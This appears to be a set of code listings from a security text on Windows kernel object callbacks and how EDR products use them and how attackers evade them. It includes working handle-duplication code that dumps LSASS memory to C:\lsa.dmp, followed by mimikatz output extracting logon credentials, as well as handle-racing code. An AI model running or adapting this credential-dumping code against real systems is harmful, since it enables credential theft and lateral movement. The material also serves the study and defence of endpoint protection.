["```\ntypedef struct _OB_CALLBACK_REGISTRATION {\n  USHORT                    Version;\n  USHORT                    OperationRegistrationCount;\n  UNICODE_STRING            Altitude;\n  PVOID                     RegistrationContext;\n  OB_OPERATION_REGISTRATION *OperationRegistration;\n} OB_CALLBACK_REGISTRATION, *POB_CALLBACK_REGISTRATION;\n```", "```\ntypedef struct _OB_OPERATION_REGISTRATION {\n  POBJECT_TYPE                *ObjectType;\n  OB_OPERATION                Operations;\n  POB_PRE_OPERATION_CALLBACK  PreOperation; POB_POST_OPERATION_CALLBACK PostOperation;\n} OB_OPERATION_REGISTRATION, *POB_OPERATION_REGISTRATION;\n```", "```\nPVOID g_pObCallbackRegHandle;\nNTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegPath)\n{\n    NTSTATUS status = STATUS_SUCCESS;\n    OB_CALLBACK_REGISTRATION CallbackReg;\n    OB_OPERATION_REGISTRATION OperationReg;\n\n    RtlZeroMemory(&CallbackReg, sizeof(OB_CALLBACK_REGISTRATION));\n    RtlZeroMemory(&OperationReg, sizeof(OB_OPERATION_REGISTRATION));\n\n    `--snip--`\n\n    CallbackReg.Version = OB_FLT_REGISTRATION_VERSION;\n ❶ CallbackReg.OperationRegistrationCount = 1; RtlInitUnicodeString(&CallbackReg.Altitude, ❷ L\"28133.08004\");\n    CallbackReg.RegistrationContext = NULL;\n\n    OperationReg.ObjectType = ❸ PsProcessType;\n    OperationReg.Operations = ❹ OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;\n ❺ OperationReg.PreOperation = ObjectNotificationCallback;\n\n    CallbackReg.OperationRegistration = ❻ &OperationReg;\n\n    status = ❼ ObRegisterCallbacks(&CallbackReg, &g_pObCallbackRegHandle);\n    if (!NT_SUCCESS(status))\n    {\n       return status;\n    }\n\n    `--snip--`\n}\nOB_PREOP_CALLBACK_STATUS ObjectNotificationCallback(\n  PVOID RegistrationContext,\n  POB_PRE_OPERATION_INFORMATION Info)\n{\n      `--snip--`\n}\n```", "```\n2: kd> **dt nt!_OBJECT_TYPE poi(nt!PsProcessType)**\n  +0x000 TypeList         : _LIST_ENTRY [0xffffad8b`9ec8e220 - 0xffffad8b`9ec8e220]\n  +0x010 Name             : _UNICODE_STRING \"Process\"\n  +0x020 DefaultObject    : (null)\n  +0x028 Index            : 0x7 ' '\n  +0x02c TotalNumberOfObjects : 0x7c\n  +0x030 TotalNumberOfHandles : 0x4ce\n  +0x034 HighWaterNumberOfObjects  : 0x7d\n  +0x038 HighWaterNumberOfHandles  : 0x4f1\n  +0x040 TypeInfo         : _OBJECT_TYPE_INITIALIZER\n  +0x0b8 TypeLock         : _EX_PUSH_LOCK\n  +0x0c0 Key              : 0x636f7250\n  +0x0c8 CallbackList     : _LIST_ENTRY [0xffff9708`64093680 - 0xffff9708`64093680]\n```", "```\nTypedef struct _CALLBACK_ENTRY_ITEM {\n    LIST_ENTRY EntryItemList;\n    OB_OPERATION Operations;\n    DWORD Active;\n    PCALLBACK_ENTRY CallbackEntry;\n    POBJECT_TYPE ObjectType;\n    POB_PRE_OPERATION_CALLBACK PreOperation;\n    POB_POST_OPERATION_CALLBACK PostOperation;\n    __int64 unk;\n} CALLBACK_ENTRY_ITEM, * PCALLBACK_ENTRY_ITEM;\n```", "```\n2: kd> **!list -x \".if (poi(@$extret+0x28) != 0) {lmDva (poi(@$extret+0x28));}\"**\n**(poi(nt!PsProcessType)+0xc8)**\n\nBrowse full module list\nstart             end               module name fffff802`73b80000 fffff802`73bf2000 WdFilter (no symbols)\n    Loaded symbol image file: WdFilter.sys\n  ❶ Image path: \\SystemRoot\\system32\\drivers\\wd\\WdFilter.sys\n    Image name: WdFilter.sys\n    Browse all global symbols functions data\n    Image was built with /Brepro flag.\n    Timestamp:        629E0677 (This is a reproducible build file hash, not a timestamp)\n    CheckSum:         0006EF0F\n    ImageSize:        00072000\n    Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4\n    Information from resource tables:\n```", "```\ntypedef struct _OB_PRE_OPERATION_INFORMATION {\n  OB_OPERATION                 Operation;\n  union {\n    ULONG Flags;\n    struct {\n      ULONG KernelHandle : 1;\n      ULONG Reserved : 31; };\n  };\n  PVOID                        Object;\n  POBJECT_TYPE                 ObjectType;\n  PVOID                        CallContext;\n  POB_PRE_OPERATION_PARAMETERS Parameters;\n} OB_PRE_OPERATION_INFORMATION, *POB_PRE_OPERATION_INFORMATION;\n```", "```\ntypedef struct _OB_PRE_CREATE_HANDLE_INFORMATION {\n  ACCESS_MASK DesiredAccess;\n  ACCESS_MASK OriginalDesiredAccess;\n} OB_PRE_CREATE_HANDLE_INFORMATION, *POB_PRE_CREATE_HANDLE_INFORMATION;\n```", "```\ntypedef struct _OB_PRE_DUPLICATE_HANDLE_INFORMATION {\n  ACCESS_MASK DesiredAccess;\n  ACCESS_MASK OriginalDesiredAccess;\n  PVOID       SourceProcess;\n  PVOID       TargetProcess;\n} OB_PRE_DUPLICATE_HANDLE_INFORMATION, *POB_PRE_DUPLICATE_HANDLE_INFORMATION;\n```", "```\nPSYSTEM_HANDLE_INFORMATION GetSystemHandles()\n{\n    NTSTATUS status = STATUS_SUCCESS;\n    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;\n    ULONG ulSize = sizeof(SYSTEM_HANDLE_INFORMATION);\n\n    pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(ulSize);\n    if (!pHandleInfo)\n    {\n        return NULL;\n    }\n\n    status = NtQuerySystemInformation(\n      ❶ SystemHandleInformation,\n        pHandleInfo,\n        ulSize, &ulSize);\n\n    while (status == STATUS_INFO_LENGTH_MISMATCH)\n    {\n        free(pHandleInfo);\n        pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(ulSize);\n        status = NtQuerySystemInformation(\n            SystemHandleInformation, 1\n          ❷ pHandleInfo,\n            ulSize, &ulSize);\n    } if (status != STATUS_SUCCESS)\n    {\n        return NULL;\n    }\n}\n```", "```\nfor (DWORD i = 0; i < pHandleInfo->NumberOfHandles; i++)\n{\n    SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleInfo->Handles[i];\n\n  ❶ if (handleInfo.UniqueProcessId != g_dwLsassPid && handleInfo.UniqueProcessId != 4)\n  {\n      HANDLE hTargetProcess = OpenProcess(\n          PROCESS_DUP_HANDLE,\n          FALSE,\n          handleInfo.UniqueProcessId);\n\n      if (hTargetProcess == NULL)\n      {\n          continue;\n      }\n\n      HANDLE hDuplicateHandle = NULL;\n        if (!DuplicateHandle(\n          hTargetProcess,\n          (HANDLE)handleInfo.HandleValue,\n          GetCurrentProcess(),\n          &hDuplicateHandle,\n          0, 0, DUPLICATE_SAME_ACCESS))\n      {\n          continue;\n      }\n\n      status = NtQueryObject(\n          hDuplicateHandle,\n          ObjectTypeInformation,\n          NULL, 0, &ulReturnLength);\n      if (status == STATUS_INFO_LENGTH_MISMATCH)\n      {\n          PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInfo =\n              (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(ulReturnLength);\n          if (!pObjectTypeInfo)\n          {\n              break;\n          } status = NtQueryObject(\n              hDuplicateHandle,\n            ❷ ObjectTypeInformation,\n              pObjectTypeInfo,\n              ulReturnLength,\n              &ulReturnLength);\n          if (status != STATUS_SUCCESS)\n          {\n              continue;\n          }\n\n        ❸ if (!_wcsicmp(pObjectTypeInfo->TypeName.Buffer, L\"Process\"))\n          {\n              `--snip--`\n          }\n          free(pObjectTypeInfo);\n      }\n    }\n}\n```", "```\nif (!_wcsicmp(pObjectTypeInfo->TypeName.Buffer, L\"Process\"))\n{\n    LPWSTR szImageName = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));\n    DWORD dwSize = MAX_PATH * sizeof(WCHAR);\n\n  ❶ if (QueryFullProcessImageNameW(hDuplicateHandle, 0, szImageName, &dwSize))\n   {\n        if (IsLsassHandle(szImageName) &&\n        (handleEntryInfo.GrantedAccess & PROCESS_VM_READ) == PROCESS_VM_READ &&\n        (handleEntryInfo.GrantedAccess & PROCESS_QUERY_INFORMATION) ==\n            PROCESS_QUERY_INFORMATION)\n        {\n            HANDLE hOutFile = CreateFileW(\n                L\"C:\\\\lsa.dmp\",\n                GENERIC_WRITE,\n                0,\n                NULL,\n                CREATE_ALWAYS,\n                0, NULL); ❷ if (MiniDumpWriteDump(\n                  hDuplicateHandle,\n                  dwLsassPid,\n                  hOutFile,\n                  MiniDumpWithFullMemory,\n                  NULL, NULL, NULL))\n          {\n              break;\n          }\n\n          CloseHandle(hOutFile);\n        }\n   }\n}\n```", "```\nC:\\> **HandleDuplication.exe**\nLSASS PID: 884\n[+] Found a handle with the required rights!\n Owner PID: 17600\n Handle Value: 0xff8\n Granted Access: 0x1fffff\n[>] Dumping LSASS memory to the DMP file…\n[+] Dumped LSASS memory C:\\lsa.dmp\n\nC:\\> **mimikatz.exe**\n\nmimikatz # **sekurlsa::minidump C:\\lsa.dmp**\nSwitch to MINIDUMP : 'C:\\lsa.dmp'\n\nmimikatz # **sekurlsa::logonpasswords**\nOpening : 'C:\\lsa.dmp' file for minidump…\n\nAuthentication Id : 0 ; 6189696 (00000000:005e7280)\nSession           : RemoteInteractive from 2\nUser Name         : highpriv\nDomain            : MILKYWAY\nLogon Server      : SUN\n`--snip--`\n```", "```\nOB_PREOP_CALLBACK_STATUS ObjectNotificationCallback(\n    PVOID RegistrationContext,\n    POB_PRE_OPERATION_INFORMATION Info)\n{\n    NTSTATUS status = STATUS_SUCCESS;\n ❶ if (Info->ObjectType == *PsProcessType)\n    {\n        if (Info->Operation == OB_OPERATION_HANDLE_DUPLICATE)\n        {\n            PUNICODE_STRING psTargetProcessName = HelperGetProcessName(\n              (PEPROCESS)Info->Object);\n            if (!psTargetProcessName))\n            {\n                return OB_PREOP_SUCCESS;\n            }\n\n            UNICODE_STRING sLsaProcessName = RTL_CONSTANT_STRING(L\"lsass.exe\");\n          ❷ if (FsRtlAreNamesEqual(psTargetProcessName, &sLsaProcessName, TRUE, NULL))\n            {\n              `--snip--`\n            }\n        }\n    }\n    `--snip--`\n}\n```", "```\nint main(int argc, char* argv[])\n{\n    HANDLE hParent = INVALID_HANDLE_VALUE;\n    HANDLE hIoCompletionPort = INVALID_HANDLE_VALUE;\n    HANDLE hJob = INVALID_HANDLE_VALUE;\n    JOBOBJECT_ASSOCIATE_COMPLETION_PORT jobPort;\n    HANDLE hThread = INVALID_HANDLE_VALUE;\n\n    `--snip--`\n\n    hParent = OpenProcess(PROCESS_ALL_ACCESS, true, atoi(argv[1]));\n\n ❶ hJob = CreateJobObjectW(nullptr, L\"DriverRacer\");\n\n    hIoCompletionPort = ❷ CreateIoCompletionPort(\n        INVALID_HANDLE_VALUE,\n        nullptr,\n        0, 0\n    ); jobPort = JOBOBJECT_ASSOCIATE_COMPLETION_PORT{\n        INVALID_HANDLE_VALUE,\n        hIoCompletionPort\n    };\n\n    if (!SetInformationJobObject(\n        hJob,\n        JobObjectAssociateCompletionPortInformation,\n        &jobPort,\n        sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT)\n    ))\n    {\n        return GetLastError();\n    }\n\n    if (!AssignProcessToJobObject(hJob, hParent))\n    {\n        return GetLastError();\n    }\n\n    hThread = CreateThread(\n        nullptr, 0,\n     ❸ (LPTHREAD_START_ROUTINE)GetChildHandles,\n        &hIoCompletionPort,\n        0, nullptr\n    );\n\n    WaitForSingleObject(hThread, INFINITE);\n\n    `--snip--`\n}\n```", "```\nvoid GetChildHandles(HANDLE* hIoCompletionPort)\n{\n    DWORD dwBytes = 0;\n    ULONG_PTR lpKey = 0;\n    LPOVERLAPPED lpOverlapped = nullptr;\n    HANDLE hChild = INVALID_HANDLE_VALUE;\n    WCHAR pszProcess[MAX_PATH];\n\n    do\n    {\n        if (dwBytes == 6)\n        {\n            hChild = OpenProcess( PROCESS_ALL_ACCESS,\n                true,\n             ❶ (DWORD)lpOverlapped\n            );\n\n         ❷ GetModuleFileNameExW(\n                hChild,\n                nullptr,\n                pszProcess,\n                MAX_PATH\n            );\n\n            wprintf(L\"New child handle:\\n\"\n                \"PID: %u\\n\"\n                \"Handle: %p\\n\"\n                \"Name: %ls\\n\\n\",\n                DWORD(lpOverlapped),\n                hChild,\n                pszProcess\n            );\n        }\n\n ❸ } while (GetQueuedCompletionStatus(\n        *hIoCompletionPort,\n        &dwBytes,\n        &lpKey,\n        &lpOverlapped,\n        INFINITE));\n}\n```", "```\nvoid OpenProcessThemAll(\n    const DWORD dwBasePid,\n    const DWORD dwNbrPids,\n    std::list<HANDLE>* lhProcesses,\n    const std::vector<DWORD>* vdwExistingPids)\n{\n    std::list<DWORD> pids;\n    for (auto i(0); i < dwNbrPids; i += 4)\n        if (!std::binary_search(\n            vdwExistingPids->begin(),\n            vdwExistingPids->end(),\n            dwBasePid + i))\n        {\n            pids.push_back(dwBasePid + i);\n        }\n\n    while (!bJoinThreads) {\n        for (auto it = pids.begin(); it != pids.end(); ++it)\n        {\n          ❶ if (const auto hProcess = OpenProcess(\n                DESIRED_ACCESS,\n                DESIRED_INHERITANCE,\n                *it))\n            {\n                  EnterCriticalSection(&criticalSection);\n                ❷ lhProcesses->push_back(hProcess);\n                  LeaveCriticalSection(&criticalSection);\n                  pids.erase(it);\n            }\n        }\n    }\n}\n```"]